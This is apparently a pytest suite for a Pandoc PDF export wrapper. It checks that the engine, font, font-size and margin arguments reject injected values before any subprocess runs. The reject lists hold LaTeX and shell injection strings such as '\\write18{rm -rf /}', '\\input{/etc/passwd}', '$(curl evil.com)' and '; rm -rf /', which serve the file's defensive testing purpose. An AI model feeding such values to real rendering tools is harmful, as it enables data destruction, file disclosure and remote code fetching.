"""Tests for the Pandoc export wrapper.

Audit M1 (#117): pandoc forwards LaTeX, and xelatex respects
``-shell-escape``. Without an allowlist, ``pdf_engine``, ``font``,
``font_size``, and ``margin`` flow into the argv list and can carry
LaTeX injection (``\\input{/etc/passwd}``, ``\\write18{...}``) or
shell-escape pivots. Tests pin the allowlist contract before
subprocess is ever called.
"""

from __future__ import annotations

from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from tools.export import pandoc


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


@pytest.fixture
def mock_subprocess(tmp_path: Path):
    """Mock subprocess.run so tests never actually call pandoc.

    The fake run returns a successful CompletedProcess and pretends the
    output file was written, so generate_pdf's success path completes.
    """
    output = tmp_path / "out.pdf"

    def fake_run(cmd, *args, **kwargs):
        # Pretend pandoc wrote the file
        out_idx = cmd.index("-o") + 1
        Path(cmd[out_idx]).write_bytes(b"%PDF-1.5\nfake\n")
        result = MagicMock()
        result.returncode = 0
        result.stderr = ""
        result.stdout = ""
        return result

    with patch.object(pandoc.subprocess, "run", side_effect=fake_run) as mock:
        yield mock, output


# ---------------------------------------------------------------------------
# pdf_engine allowlist
# ---------------------------------------------------------------------------


class TestPdfEngineAllowlist:
    @pytest.mark.parametrize("engine", ["xelatex", "lualatex", "pdflatex", "tectonic"])
    def test_accepts_known_engine(self, engine, mock_subprocess, tmp_path: Path):
        mock_run, output = mock_subprocess
        result = pandoc.generate_pdf(tmp_path / "in.md", output, "T", "A", pdf_engine=engine)
        assert result["success"] is True
        # The engine flag must be passed verbatim
        cmd = mock_run.call_args[0][0]
        assert f"--pdf-engine={engine}" in cmd

    @pytest.mark.parametrize(
        "evil_engine",
        [
            "--shell-escape",
            "xelatex --shell-escape",
            "; rm -rf /",
            "../escape",
            "xelatex; touch /tmp/pwn",
            "fake_engine",
        ],
    )
    def test_rejects_unknown_or_unsafe_engine(self, evil_engine, mock_subprocess, tmp_path: Path):
        mock_run, output = mock_subprocess
        result = pandoc.generate_pdf(tmp_path / "in.md", output, "T", "A", pdf_engine=evil_engine)
        assert result["success"] is False
        assert "error" in result
        # subprocess must never have been called
        mock_run.assert_not_called()


# ---------------------------------------------------------------------------
# font character whitelist
# ---------------------------------------------------------------------------


class TestFontValidation:
    @pytest.mark.parametrize(
        "font",
        [
            "Linux Libertine O",
            "EB Garamond",
            "DejaVu Serif",
            "Latin Modern Roman",
            "Source Sans Pro",
            "Times New Roman",
            "Crimson Text",
            "Noto Serif",
        ],
    )
    def test_accepts_legitimate_font(self, font, mock_subprocess, tmp_path: Path):
        mock_run, output = mock_subprocess
        result = pandoc.generate_pdf(tmp_path / "in.md", output, "T", "A", font=font)
        assert result["success"] is True

    @pytest.mark.parametrize(
        "evil_font",
        [
            "; \\input{/etc/passwd}",
            "\\write18{rm -rf /}",
            "$(curl evil.com)",
            "Linux\nLibertine",
            "Font; \\immediate\\write18{ls}",
            "{evil}",
            "font|cat",
            "../escape",
        ],
    )
    def test_rejects_unsafe_font(self, evil_font, mock_subprocess, tmp_path: Path):
        mock_run, output = mock_subprocess
        result = pandoc.generate_pdf(tmp_path / "in.md", output, "T", "A", font=evil_font)
        assert result["success"] is False
        assert "error" in result
        mock_run.assert_not_called()


# ---------------------------------------------------------------------------
# font_size and margin format
# ---------------------------------------------------------------------------


class TestFontSizeValidation:
    @pytest.mark.parametrize("size", ["10pt", "11pt", "12pt", "9pt", "14pt"])
    def test_accepts_valid_size(self, size, mock_subprocess, tmp_path: Path):
        mock_run, output = mock_subprocess
        result = pandoc.generate_pdf(tmp_path / "in.md", output, "T", "A", font_size=size)
        assert result["success"] is True

    @pytest.mark.parametrize(
        "evil_size",
        [
            "11pt; \\input{x}",
            "11",  # missing unit
            "100pt",  # absurd
            "11px",  # wrong unit
            "-11pt",
            "$(echo 11)pt",
        ],
    )
    def test_rejects_unsafe_size(self, evil_size, mock_subprocess, tmp_path: Path):
        mock_run, output = mock_subprocess
        result = pandoc.generate_pdf(tmp_path / "in.md", output, "T", "A", font_size=evil_size)
        assert result["success"] is False
        mock_run.assert_not_called()


class TestMarginValidation:
    @pytest.mark.parametrize("margin", ["1in", "2.5cm", "20mm", "0.5in", "1.25in", "30mm"])
    def test_accepts_valid_margin(self, margin, mock_subprocess, tmp_path: Path):
        mock_run, output = mock_subprocess
        result = pandoc.generate_pdf(tmp_path / "in.md", output, "T", "A", margin=margin)
        assert result["success"] is True

    @pytest.mark.parametrize(
        "evil_margin",
        [
            "1in; \\write18{ls}",
            "1",  # missing unit
            "100in",  # absurd
            "1foo",  # wrong unit
            "$(rm)in",
            "../1in",
        ],
    )
    def test_rejects_unsafe_margin(self, evil_margin, mock_subprocess, tmp_path: Path):
        mock_run, output = mock_subprocess
        result = pandoc.generate_pdf(tmp_path / "in.md", output, "T", "A", margin=evil_margin)
        assert result["success"] is False
        mock_run.assert_not_called()


# ---------------------------------------------------------------------------
# Defaults still work
# ---------------------------------------------------------------------------


class TestDefaults:
    def test_default_args_succeed(self, mock_subprocess, tmp_path: Path):
        """Control: calling with no overrides uses defaults that pass."""
        mock_run, output = mock_subprocess
        result = pandoc.generate_pdf(tmp_path / "in.md", output, "T", "A")
        assert result["success"] is True
        cmd = mock_run.call_args[0][0]
        assert "--pdf-engine=xelatex" in cmd
        assert any("mainfont=Linux Libertine O" in c for c in cmd)
        assert any("fontsize=11pt" in c for c in cmd)
        assert any("geometry:margin=1in" in c for c in cmd)
